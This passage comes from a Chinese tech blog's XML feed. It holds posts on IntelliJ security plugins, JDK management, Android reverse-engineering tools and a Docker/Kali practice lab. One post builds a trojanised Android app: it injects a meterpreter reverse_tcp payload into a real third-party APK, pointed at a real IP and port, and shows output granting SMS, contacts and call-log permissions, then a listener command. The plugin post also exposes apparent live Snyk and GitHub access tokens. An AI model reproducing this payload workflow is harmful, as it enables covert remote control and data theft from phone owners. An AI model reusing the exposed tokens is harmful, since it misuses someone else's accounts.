src="https://mmbiz.qpic.cn/mmbiz_png/eQPyBffYbucDB7I8nDz0WVxAlXgVuniaksC3KO7wkbkmEKDW6FMdhBhaCGyb9bSgQkFNjZRCB0bU8S80uPIxvkw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><h5 id="Insomnia-防止休眠"><a href="#Insomnia-防止休眠" class="headerlink" title="Insomnia-防止休眠"></a><a href="https://plugins.jetbrains.com/plugin/17755-insomniac">Insomnia</a>-防止休眠</h5><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220101222852.png"></p><h3 id="安全插件"><a href="#安全插件" class="headerlink" title="安全插件"></a>安全插件</h3><h4 id="SpotBugs"><a href="#SpotBugs" class="headerlink" title="SpotBugs"></a><a href="https://plugins.jetbrains.com/plugin/14014-spotbugs">SpotBugs</a></h4><p><a href="https://github.com/find-sec-bugs/find-sec-bugs/wiki/IntelliJ-Tutorial">https://github.com/find-sec-bugs/find-sec-bugs/wiki/IntelliJ-Tutorial</a><br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220104170209.png"></p><h4 id="Black-Duck-SCA"><a href="#Black-Duck-SCA" class="headerlink" title="Black Duck SCA"></a><a href="https://plugins.jetbrains.com/plugin/11516-synopsys-code-sight">Black Duck SCA</a></h4><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211230210819.png"></p><h4 id="WhiteSource-Advise"><a href="#WhiteSource-Advise" class="headerlink" title="WhiteSource Advise"></a><a href="https://plugins.jetbrains.com/plugin/13805-whitesource-advise-for-intellij-idea">WhiteSource Advise</a></h4><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211230222452.png"></p><h4 id="Momo-Code-Sec-Inspector"><a href="#Momo-Code-Sec-Inspector" class="headerlink" title="Momo Code Sec Inspector"></a><a href="https://github.com/momosecurity/momo-code-sec-inspector-java">Momo Code Sec Inspector</a></h4><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211230173423.png"></p><h4 id="Java-Decompiler-JD-GUI"><a href="#Java-Decompiler-JD-GUI" class="headerlink" title="Java Decompiler(JD-GUI)"></a>Java Decompiler(JD-GUI)</h4><h4 id="Jadx-Android-Decompiler"><a href="#Jadx-Android-Decompiler" class="headerlink" title="Jadx Android Decompiler"></a>Jadx Android Decompiler</h4><h4 id="Snyk"><a href="#Snyk" class="headerlink" title="Snyk"></a><a href="https://plugins.jetbrains.com/plugin/index?xmlId=io.snyk.snyk-intellij-plugin">Snyk</a></h4><h5 id="CMD模式"><a href="#CMD模式" class="headerlink" title="CMD模式"></a>CMD模式</h5><pre><code class="powershell">brew tap snyk/tap  &amp;&amp; brew install snyk snyk config set api  c70b7d5a-1a74-44df-b52c-3ab5c80d12e6</code></pre><h5 id="IDE模式"><a href="#IDE模式" class="headerlink" title="IDE模式"></a>IDE模式</h5><p>先配置<code>JAVA_HOME</code></p><pre><code class="powershell">echo &#39;## JDKexport JAVA_HOME=/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Homeexport PATH=$JAVA_HOME/bin:$PATH&#39;  &gt;&gt; ~/.zshrc</code></pre><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211230173024.png"></p><h4 id="jclasslib-bytecode-viewer-查看字节码"><a href="#jclasslib-bytecode-viewer-查看字节码" class="headerlink" title="jclasslib bytecode viewer 查看字节码"></a>jclasslib bytecode viewer 查看字节码</h4><h4 id="Jadx-Android-Decompiler-1"><a href="#Jadx-Android-Decompiler-1" class="headerlink" title="Jadx Android Decompiler"></a>Jadx Android Decompiler</h4><h4 id="RIPS-Security-Analysis"><a href="#RIPS-Security-Analysis" class="headerlink" title="RIPS Security Analysis"></a>RIPS Security Analysis</h4><h4 id="RestfulTool——-快捷跳转Action方法"><a href="#RestfulTool——-快捷跳转Action方法" class="headerlink" title="RestfulTool—— 快捷跳转Action方法"></a>RestfulTool—— 快捷跳转Action方法</h4><p><img src="https://mmbiz.qpic.cn/mmbiz_png/eQPyBffYbucDB7I8nDz0WVxAlXgVuniakHgF8atqV8PGEuH9JDkHKGKNpfCial2hOF8ONySpxNRBsE9zdAzNX9Lg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="snyk"><a href="#snyk" class="headerlink" title="snyk"></a>snyk</h4><h4 id="SonarLint-代码质量检查插件"><a href="#SonarLint-代码质量检查插件" class="headerlink" title="SonarLint 代码质量检查插件"></a>SonarLint 代码质量检查插件</h4><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_jpg/knmrNHnmCLF51wyFzvHFUlCcp8Nms74EYzic9yxWfOEXrmX4zR8SUnyaicfQkgCbxwNl13RcUIYvq62cRPXfJ8Lg/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><h2 id="Version-Control"><a href="#Version-Control" class="headerlink" title="Version Control"></a>Version Control</h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227173633.png"></p><h3 id="与Gitlab集成"><a href="#与Gitlab集成" class="headerlink" title="与Gitlab集成"></a>与Gitlab集成</h3><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227135846.png"></p><h2 id="Build-Excution-Deployment"><a href="#Build-Excution-Deployment" class="headerlink" title="Build, Excution,Deployment"></a>Build, Excution,Deployment</h2><h3 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h3><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227144953.png"></p><h3 id="Compiler"><a href="#Compiler" class="headerlink" title="Compiler"></a>Compiler</h3><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220104233533.png"></p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227143912.png"></p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227113848.png"></p><h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a><a href="https://mp.weixin.qq.com/s?__biz=MzUyMzM2ODUwMA==&mid=2247493487&idx=2&sn=2a117b44b5dd666ddd79ebf90940831a&chksm=fa3f0634cd488f22657c709768ceb59cab1c4dda36185984e6d0dd5c5fd191e80a0b6b21c2c2&scene=178&cur_album_id=1909669645461061636#rd">Debug</a></h3><p>当调用<code>ConcurrentLinkedQueue</code>类的<code>toString()</code>方法时会获取队列的迭代器，而创建迭代器时会调用队列的<code>first()</code>方法，在<code>first()</code>方法里会修改head的属性，从而导致输出的结果不一致<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220206221748.png"></p><p>在远程调试时，我们发现有些类的断点一直断不上问题，该问题可能出在 IntelliJ 的 <code>Settings -&gt; Debugger -&gt; Stepping</code> 配置上。若勾选了 <code>Do not step into the classes</code>，则会让这些断点失效:</p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227143422.png"></p><h4 id="本地调试"><a href="#本地调试" class="headerlink" title="本地调试"></a>本地调试</h4><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211124144856.png" alt="local-debug"></p><h4 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h4><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211124151022.png" alt="remote-debug"></p><h4 id="对第三方jar包进行调试"><a href="#对第三方jar包进行调试" class="headerlink" title="对第三方jar包进行调试"></a>对第三方jar包进行调试</h4><ol><li><p>创建工程，将jar包添加到依赖库中<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227204419.png"></p></li><li><p>在Main函数处打断点，添加调试配置，运行程序，点击debug<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227204510.png"></p></li></ol><h2 id="Language-amp-Frameworks"><a href="#Language-amp-Frameworks" class="headerlink" title="Language &amp; Frameworks"></a>Language &amp; Frameworks</h2><h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><h3 id="Setting-Repository-使用git仓库保存Idea配置文件Settings"><a href="#Setting-Repository-使用git仓库保存Idea配置文件Settings" class="headerlink" title="Setting Repository- 使用git仓库保存Idea配置文件Settings"></a>Setting Repository- 使用git仓库保存Idea配置文件Settings</h3><p>Access-Token <code>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</code></p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220109130029.png"></p><h2 id="Advanced-Settings"><a href="#Advanced-Settings" class="headerlink" title="Advanced Settings"></a>Advanced Settings</h2><h2 id="Other-Settings"><a href="#Other-Settings" class="headerlink" title="Other Settings"></a>Other Settings</h2><p>代码对比效果图<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227130636.png"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>利用msf框架对安卓手机进行简单操作</title>
      <link href="Kali/Exploit/%E5%88%A9%E7%94%A8msf%E6%A1%86%E6%9E%B6%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C.html"/>
      <url>Kali/Exploit/%E5%88%A9%E7%94%A8msf%E6%A1%86%E6%9E%B6%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>aptkool</p><p>利用msf框架对安卓手机进行简单操作 </p><p>渗透安卓</p><ol><li>环境准备<pre><code>  1.  `brew install --cask android-sdk  &amp;&amp; brew install apktool`    2.   `sdkmanager &quot;platform-tools&quot; &quot;build-tools;28.0.3&quot; &quot;platforms;android-28&quot; `  安装zipalign  3.   `export PATH=$PATH:/usr/local/Caskroom/android-sdk/4333796/build-tools/28.0.3`   配置zipalign  4.   </code></pre></li><li>制作APK<pre><code class="zsh">msfvenom --platform android       -x Desktop/jihu.jihuapp_2.7.12_20712.apk       -p android/meterpreter/reverse_tcp       lhost=101.132.34.104 lport=19003       -o Desktop/jihu_evil.apk</code></pre></li></ol><p>Using APK template: Desktop/jihu.jihuapp_2.7.12_20712.apk<br>[-] No arch selected, selecting arch: dalvik from the payload<br>[<em>] Creating signing key and keystore..<br>[</em>] Decompiling original APK..<br>[<em>] Decompiling payload APK..<br>[</em>] Locating hook point..<br>[<em>] Adding payload as package jihu.jihuapp.glfku<br>[</em>] Loading /var/folders/v6/g93y9wqj229_s53gx3yp67q00000gn/T/d20210816-2205-4bcwjl/original/smali_classes4/jihu/jihuapp/MainActivity.smali and injecting payload..<br>[<em>] Poisoning the manifest with meterpreter permissions..<br>[</em>] Adding <uses-permission android:name="android.permission.WRITE_SETTINGS"/><br>[<em>] Adding <uses-permission android:name="android.permission.RECEIVE_SMS"/><br>[</em>] Adding <uses-permission android:name="android.permission.WRITE_CONTACTS"/><br>[<em>] Adding <uses-permission android:name="android.permission.SEND_SMS"/><br>[</em>] Adding <uses-permission android:name="android.permission.READ_CALL_LOG"/><br>[<em>] Adding <uses-permission android:name="android.permission.CALL_PHONE"/><br>[</em>] Adding <uses-permission android:name="android.permission.WRITE_CALL_LOG"/><br>[<em>] Adding <uses-permission android:name="android.permission.READ_CONTACTS"/><br>[</em>] Adding <uses-permission android:name="android.permission.READ_SMS"/><br>[<em>] Adding <uses-permission android:name="android.permission.SET_WALLPAPER"/><br>[</em>] Adding <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/><br>[<em>] Adding <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/><br>[</em>] Rebuilding apk with meterpreter injection as /var/folders/v6/g93y9wqj229_s53gx3yp67q00000gn/T/d20210816-2205-4bcwjl/output.apk<br>[<em>] Signing /var/folders/v6/g93y9wqj229_s53gx3yp67q00000gn/T/d20210816-2205-4bcwjl/output.apk<br>[</em>] Aligning /var/folders/v6/g93y9wqj229_s53gx3yp67q00000gn/T/d20210816-2205-4bcwjl/output.apk<br>Payload size: 23173289 bytes<br>Saved as: Desktop/jihu_evil.apk</p><pre><code>3 监听```zshhandler -H 101.132.34.104 -P 19003 -p android/meterpreter/reverse_tcp</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux上多版本JDK该如何管理</title>
      <link href="Tools/linux%E4%B8%8A%E5%A4%9A%E7%89%88%E6%9C%ACJDK%E8%AF%A5%E5%A6%82%E4%BD%95%E7%AE%A1%E7%90%86.html"/>
      <url>Tools/linux%E4%B8%8A%E5%A4%9A%E7%89%88%E6%9C%ACJDK%E8%AF%A5%E5%A6%82%E4%BD%95%E7%AE%A1%E7%90%86.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h3 id="Oracle-JDK-8"><a href="#Oracle-JDK-8" class="headerlink" title="Oracle JDK_8"></a>Oracle JDK_8</h3><p><a href="https://www.oracle.com/java/technologies/downloads/#java8">jdk-8u291-linux-x64.tar.gz</a></p><pre><code class="shell">tar -x -C /opt/jdk -f jdk-8u66-linux-x64.tar.gz   # 解压jdk到/opt/jdk目录update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_291/bin/java 100   update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_291/bin/javac 100update-alternatives --remove java /opt/jdk1.8.0_291/bin/javaupdate-alternatives --remove javac /opt/jdk1.8.0_291/bin/java</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Android软件安全测试软件_mac平台</title>
      <link href="Tools/Android%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%BD%AF%E4%BB%B6-mac%E5%B9%B3%E5%8F%B0.html"/>
      <url>Tools/Android%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%BD%AF%E4%BB%B6-mac%E5%B9%B3%E5%8F%B0.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="搭建Android程序分析环境"><a href="#搭建Android程序分析环境" class="headerlink" title="搭建Android程序分析环境"></a>搭建Android程序分析环境</h1><h2 id="常见逆向分析工具"><a href="#常见逆向分析工具" class="headerlink" title="常见逆向分析工具"></a>常见逆向分析工具</h2><ul><li>Adnroid Studio</li></ul><pre><code class="shell">brew install --cask android-studio      # 安装Adnroid Studio</code></pre><ul><li>apktool</li></ul><pre><code class="shell">brew install apktool    # 提供反编译与回编译功能</code></pre><ul><li>smali/baksmail</li></ul><pre><code class="shell">brew install smali     # dex文件的反编译与回编译工具</code></pre><ul><li>dex2jar &amp; jd-gui</li></ul><pre><code class="shell">brew install dex2jar         # 将dex文件转成jar包brew install --cask jd-gui   # 查看jar包源码</code></pre><ul><li>jadx</li></ul><pre><code class="shell">brew install jadx          # 将.dex/.jar/.class反编译成.java</code></pre><ul><li>010 Editor</li></ul><pre><code class="shell">brew install --cask 010-editor    # 二进制编辑器</code></pre><ul><li><p>JEB</p></li><li><p><a href="https://github.com/androguard/androguard">Androguard</a></p></li><li><p>集成工具 <a href="https://github.com/Jermic/Android-Crack-Tool">Android-Crack-Tool</a></p></li><li><p><a href="https://github.com/liaojack8/AndroidKiller">Android-Killer</a></p></li><li><p><a href="https://github.com/rednaga/APKiD">APKiD</a></p></li></ul><h2 id="编译Android源码"><a href="#编译Android源码" class="headerlink" title="编译Android源码"></a>编译Android源码</h2><p>下载源码</p><pre><code class="shell">repo init -u https://android.googlesource.com/platform/manifest -b android-7.1.1_r1repo sync --force-sync  --force-broken</code></pre><h3 id="macOS下直接编译"><a href="#macOS下直接编译" class="headerlink" title="macOS下直接编译"></a>macOS下直接编译</h3><p>需安装XCode命令行工具和macOS SDK</p><pre><code class="shell">xcode-select --install</code></pre><p>编译Android源码</p><pre><code class="shell">export USE_CCACHE=1mkdir ccacheexport CCACHE_DIR=ccacheprebuilts //misc/darwin-x86/ccache/ccache -M 50Gsudo xcode-select -s /Applications/Xcode.app/Content/Developerexport JAVA_HOME=$(/usr/libexec/java_home -v 1.8)source build/envsetup.shlunch aosp_angler-userdebugmake clobberbrew uninstall curl &amp;&amp; brew install curl --with-opensslexport PATH=$(brew --prefix curl)/bin:$PATHcaffeinate make -j8</code></pre><h3 id="在Docker中编译Android源码-推荐"><a href="#在Docker中编译Android源码-推荐" class="headerlink" title="在Docker中编译Android源码-推荐"></a>在Docker中编译Android源码-推荐</h3><pre><code class="shell">brew install --cask docker docker-toolbox</code></pre><p>打开<em>Kitematic.app</em> 搜索 <code>aosp</code> 选择4.4版，点击<code>create</code> </p><p>下载后</p><p>修改android源码和ccache缓存位置,</p><p>重启</p><p>执行 <code>make -j4</code></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基于docker的网络安全靶场搭建-主机篇</title>
      <link href="Tools/%E5%9F%BA%E4%BA%8Edocker%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA-%E4%B8%BB%E6%9C%BA%E7%AF%87.html"/>
      <url>Tools/%E5%9F%BA%E4%BA%8Edocker%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA-%E4%B8%BB%E6%9C%BA%E7%AF%87.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>基于docker的网络安全靶场搭建-主机篇</p><ul><li><a href="#%E6%93%8D%E4%BD%9C%E6%9C%BA-kali%E6%90%AD%E5%BB%BA">操作机-kali搭建</a><ul><li><a href="#%E5%90%AF%E5%8A%A8kali%E5%AE%B9%E5%99%A8">启动kali容器</a></li><li><a href="#%E5%AE%89%E8%A3%85%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E5%8C%85">安装基础环境包</a></li><li><a href="#%E7%94%9F%E6%88%90%E9%95%9C%E5%83%8F-kali-2021">生成镜像 kali-2021</a><ul><li><a href="#%E6%8E%A8%E9%80%81%E9%95%9C%E5%83%8F%E5%88%B0dockerhub">推送镜像到DockerHub</a></li></ul></li><li><a href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">远程桌面环境配置</a><ul><li><a href="#%E4%BD%BF%E7%94%A8%E6%96%B0%E9%95%9C%E5%83%8F%E7%94%9F%E6%88%90%E5%AE%B9%E5%99%A8%E5%B9%B6%E8%BF%9B%E5%85%A5%E5%AE%B9%E5%99%A8">使用新镜像生成容器并进入容器</a></li><li><a href="#%E6%9B%B4%E6%8D%A2kali%E6%BA%90">更换Kali源</a></li><li><a href="#%E5%AE%89%E8%A3%85%E6%A1%8C%E9%9D%A2%E7%8E%AF%E5%A2%83%E7%9B%B8%E5%85%B3%E6%9C%8D%E5%8A%A1">安装桌面环境相关服务</a></li><li><a href="#%E9%85%8D%E7%BD%AExrdp%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8">配置xrdp设置开机自启动</a></li></ul></li></ul></li><li><a href="#web%E9%9D%B6%E6%9C%BA%E5%88%B6%E4%BD%9C">Web靶机制作</a><ul><li><a href="#%E5%90%AF%E5%8A%A8tomcat-mysql%E5%AE%B9%E5%99%A8">启动tomcat-mysql容器</a></li></ul></li></ul><h1 id="操作机-kali搭建"><a href="#操作机-kali搭建" class="headerlink" title="操作机-kali搭建"></a>操作机-kali搭建</h1><h2 id="启动kali容器"><a href="#启动kali容器" class="headerlink" title="启动kali容器"></a>启动kali容器</h2><pre><code class="zsh">docker search kali                    # 搜索kali基础镜像docker pull kalilinux/kali-rolling    # 拉取基础镜像docker images                         # 查看镜像docker run -itd -p 3399:3389 kalilinux/kali-rolling /bin/bash                                        # 后台运行容器 宿主3399映射到kali的3389docker ps -a                          # 查看容器相关信息docker attach &lt;Container-ID&gt;          # 进入容器</code></pre><h2 id="安装基础环境包"><a href="#安装基础环境包" class="headerlink" title="安装基础环境包"></a>安装基础环境包</h2><pre><code class="zsh">apt-get -y update &amp;&amp; apt-get -y upgrade &amp;&amp; \   DEBIAN_FRONTEND=noninteractive apt-get install -y \   kali-tools-top10 \   pciutils \   vim \   iputils-ping \   bash-completion &amp;&amp; \   apt-get autoremove -y &amp;&amp; \   apt-get clean</code></pre><ul><li><code>DEBIAN_FRONTEND=noninteractive</code> 取消交互，直接运行命令，而无需向用户请求输入</li><li><code>kali-tools-top10</code> kai常用工具</li><li><code>pciutils</code> lspci工具</li><li><code>vim</code> 文本编辑器</li><li><code>iputils-ping</code> ping命令</li><li><code>bash-completion</code> 命令自动补全</li></ul><h2 id="生成镜像-kali-2021"><a href="#生成镜像-kali-2021" class="headerlink" title="生成镜像 kali-2021"></a>生成镜像 kali-2021</h2><pre><code class="zsh">docker commit &lt;Container-ID&gt;  &lt;Image-Name&gt;            # 生成镜像docker commit kali-2021 crkmyth1cal/kali20201:v1      # 可选，生成镜像并发布</code></pre><h3 id="推送镜像到DockerHub"><a href="#推送镜像到DockerHub" class="headerlink" title="推送镜像到DockerHub"></a>推送镜像到DockerHub</h3><pre><code class="zsh">docker login                             # 登陆dockerdocker push  crkmyth1cal/kali20201:v1    # 推送镜像docker logout                            # 退出docker</code></pre><h2 id="远程桌面环境配置"><a href="#远程桌面环境配置" class="headerlink" title="远程桌面环境配置"></a>远程桌面环境配置</h2><h3 id="使用新镜像生成容器并进入容器"><a href="#使用新镜像生成容器并进入容器" class="headerlink" title="使用新镜像生成容器并进入容器"></a>使用新镜像生成容器并进入容器</h3><p><code>Ctrl+P+Q</code> 退出容器不终止容器</p><pre><code class="zsh">docker run -itd -p 3399:3389 kali-2021                        # 后台运行容器，返回容器IDdocker run -itd -p 3399:3389  -v /tmp/kevin:/data  kali-2021  # 可选： 挂在本地文件docker exec -it &lt;ID&gt;  /bin/bash                               # 临时开启shell，退出时容器不停止 exec-running container  run-new containerdocker start -a &lt;ID&gt;                                          # 进入被Exited的容器</code></pre><h3 id="更换Kali源"><a href="#更换Kali源" class="headerlink" title="更换Kali源"></a>更换Kali源</h3><pre><code class="zsh">echo &quot;deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib&quot; | sudo tee /etc/apt/sources.listapt-get update</code></pre><h3 id="安装桌面环境相关服务"><a href="#安装桌面环境相关服务" class="headerlink" title="安装桌面环境相关服务"></a>安装桌面环境相关服务</h3><pre><code class="zsh">apt-get -y install kali-desktop-xfce xorg xrdppasswd root      # 修改root密码</code></pre><ul><li><code>kali-desktop-xfce</code> xfce桌面环境</li><li><code>xorg</code> 是x11的实现，提供X server</li><li><code>xrdp</code> 远程桌面服务</li></ul><h3 id="配置xrdp设置开机自启动"><a href="#配置xrdp设置开机自启动" class="headerlink" title="配置xrdp设置开机自启动"></a>配置xrdp设置开机自启动</h3><pre><code class="zsh">sed -i &#39;s/port=3399/port=3389/g&#39; /etc/xrdp/xrdp.ini     # 修改xrdp服务端口service xrdp restart                                    # 重启xrdp服务update-rc.d xrdp enable                                 # xrdp开机自启动</code></pre><h1 id="Web靶机制作"><a href="#Web靶机制作" class="headerlink" title="Web靶机制作"></a>Web靶机制作</h1><h2 id="启动tomcat-mysql容器"><a href="#启动tomcat-mysql容器" class="headerlink" title="启动tomcat-mysql容器"></a>启动tomcat-mysql容器</h2><pre><code class="zsh">docker search tomcat-mysql                                     # 搜索tomcat-mysql镜像docker pull aallam/tomcat-mysql                                # 下载tomcat-msyql镜像docker run -d --name=&quot;tomcat-mysql-run&quot;  \              -e MYSQL_PASSWORD=root \                    -p 1306:3306 -p 1080:8080   aallam/tomcat-mysql  # 后台启动， docker exec –it ID /bin/bash                                  # 进入tomcat-mysql</code></pre><p>参考<br><a href="https://mp.weixin.qq.com/s/QR9T1TOVIM0sh_TlJhe6Ag">基于docker的网络安全靶场搭建-主机篇</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>macOS使用记录</title>
      <link href="askDing/macOS%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95.html"/>
      <url>askDing/macOS%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95.html</url>
      
        <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none"></div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>免杀专题思考</title>
      <link href="Tools/%E5%85%8D%E6%9D%80%E4%B8%93%E9%A2%98%E6%80%9D%E8%80%83.html"/>
      <url>Tools/%E5%85%8D%E6%9D%80%E4%B8%93%E9%A2%98%E6%80%9D%E8%80%83.html</url>
      
